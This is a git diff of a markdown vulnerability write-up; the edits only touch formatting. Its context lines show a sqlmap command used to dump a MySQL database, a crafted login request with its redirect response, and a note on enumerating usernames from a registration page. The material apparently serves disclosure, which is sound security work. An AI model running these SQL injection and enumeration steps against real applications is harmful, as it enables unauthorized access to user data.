@@ -215,7 +215,7 @@ python3 sqlmap.py -r test.txt --level=3 --risk=3 --batch --dbms=mysql --threads=
 ![Alt Text](https://i.ibb.co/Qpw8sDq/dump-db.png)
 
 8) Later it was found that what function leads to this
-```
+```js
 function check_user(user) {
 
 
@@ -401,7 +401,7 @@ Connection: close
 user=attacker&pass=password
 ```
 2) Should get response like (If it's invalid creds set)
-Response => 
+- Response => 
 ```
 HTTP/1.1 302 Found
 Date: Wed, 30 Sep 2020 08:52:54 GMT
@@ -432,7 +432,7 @@ Content-Type: text/html
 5) Now enter the valid creds and login
    ![Alt Text](https://i.ibb.co/L8RVGSk/valid-login.png)
 
-Which now contains a redirection for ** myaccount.php** endpoint.
+Which now contains a redirection for **myaccount.php** endpoint.
 
 6) Attacker just need to know the usernames which could be enumerated from register section as it tends to show if  username exists or not. Like,
 
